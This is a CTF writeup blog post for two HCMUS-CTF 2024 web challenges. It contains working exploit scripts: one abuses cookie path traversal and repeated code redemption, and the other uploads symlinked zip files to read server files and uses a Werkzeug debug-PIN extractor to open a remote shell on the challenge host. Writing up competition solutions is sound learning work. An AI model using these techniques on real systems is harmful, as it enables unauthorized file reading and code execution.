---
title: HCMUS-CTF(Qualification) 2024 Writeup
published: 2025-04-02
description: 'Writeup for HCMUS-CTF 2024'
image: ''
tags: [web, ctf, writeup]
category: 'writeup'
draft: false 
lang: ''
---

## Web
### BP Airdrop
**Description**
A free airdrop website for everyone! Come and get your free BP!

**Analyze**
When I read the source code I come across this `let file = __dirname + '/../data/account/' + username + '.json';`
So I think to myself, why the website just let me login with any username and no password? Is that the hint? 

Then I try to path traversal with username = "../logs". Then I don't know what to do next :)). It is kind of a lucky challenge for me. I try to fucking around with the web application and see this weird behaviour:

1. Redeem the code "wqry-pmpo-tzve-mbk3"
2. Go to /api/logs
3. Go to /redeem and redeem the same code again, get extra balance
4. Loop 1000 times to get the flag =))

Then I write the exploit script as fast as I could and don't even look back and understand why because my team is in a rush, maybe in the next day I will look at it again.
**Exploit script**
```
import requests
import time
url1 = "http://chall.blackpinker.com:33415/api/logs"

cookies = {
    "username": "Li4vbG9n",
}

url2 = "http://chall.blackpinker.com:33415/redeem"
data = {
    "airdropCode":"wqry-pmpo-tzve-mbk3"    
}


for i in range(0, 1000):
    responseGet = requests.get(url1, cookies=cookies)
    responsePost = requests.post(url2, cookies=cookies, data=data)
    if(i % 10 == 0):
        time.sleep(1)
```

**Flag**: HCMUS-CTF{5trIct_eqU@l!Ty_!SN't_!T_101193d7181cc883}
Look likes it related to strict equality , hmm ?
### FlashyZ
**Description**
A simple web service which will unzip your files in a flash!

Hint: Flask debug is not good for production

Hint 2: Do you know about symlink?

**Analyze**
The hint has help my team a lot, with the hint my team is able to find 3 links:
1. https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
2. https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload
3. https://github.com/Ruulian/wconsole_extractor

The first link basically said when flask app is in debug mode, we can get RCE but with a condition: a function to read arbitrary file on the server. If that happen, we can use the tool in the 3rd link to automatically exploit the server and get the RCE.

So I try to find way to get the content of arbitary file => Which is the tips in the second link: Upload a zip file that contain symlinks to the target file on the server so when the server unzip it, we can read the content of the symlinks.

In the process of use the tool in 3rd link, I came across some bug that require me to manually edit the source code of the tool, then I realized I have to specify the python and werkzeug version in the tool's source code

```
self.python_version = "3.10.15"
self.werkzeug_version = "3.1.3"
```

Here are the exploit script:
```
import os
import zipfile
import requests
from bs4 import BeautifulSoup
import re

SYMLINK_PATH = "symindex.txt"
ZIP_FILENAME = "test.zip"
UPLOAD_URL = "http://chall.blackpinker.com:33697/upload"  
def upload_file():
    try:
        with open(ZIP_FILENAME, 'rb') as f:
            files = {'file': (ZIP_FILENAME, f)}
            response = requests.post(UPLOAD_URL, files=files)
            # print(response.text)
            soup = BeautifulSoup(response.text, 'html.parser')
            link = soup.find('a', href=True)
            
            if link:
                href = link['href']
                print(f"Full link: {href}")
                
                match = re.search(r'/list/([a-f0-9\-]+)', href)
                if match:
                    uuid = match.group(1)
                    print(f"Extracted UUID: {uuid}")
                    return uuid
                else:
                    print("No UUID found in the link.")
            else:
                print("No link found in the response.")
    except Exception as e:
        print(f"Error uploading file: {e}")
        raise

from main import WConsoleExtractor, info

def leak_function(filename) -> str:
    filename = "../../.." + filename
    print(filename)
    if os.path.exists(SYMLINK_PATH):
        os.remove(SYMLINK_PATH)
    if os.path.exists(ZIP_FILENAME):
        os.remove(ZIP_FILENAME)
    os.system(f"rm symindex.txt; sudo ln -s {filename} symindex.txt")
    os.system(f"sudo zip --symlinks test.zip symindex.txt")
    upload_file()
    uuid = upload_file()
    r = requests.get(f"http://chall.blackpinker.com:33697/view/{uuid}/symindex.txt")
    if r.status_code == 200 and "<!DOCTYPE html>" not in r.text:
        return r.text
    else:
        return ""

# print(leak_function("/etc/machine-id"))
extractor = WConsoleExtractor(
    target="http://chall.blackpinker.com:33697",
    leak_function=leak_function,
)

info(f"PIN CODE: {extractor.pin_code}")
extractor.shell()
        

```

**Flag**: HCMUS-CTF{symply_unzip2rce_23fe1ecf18f7617f}

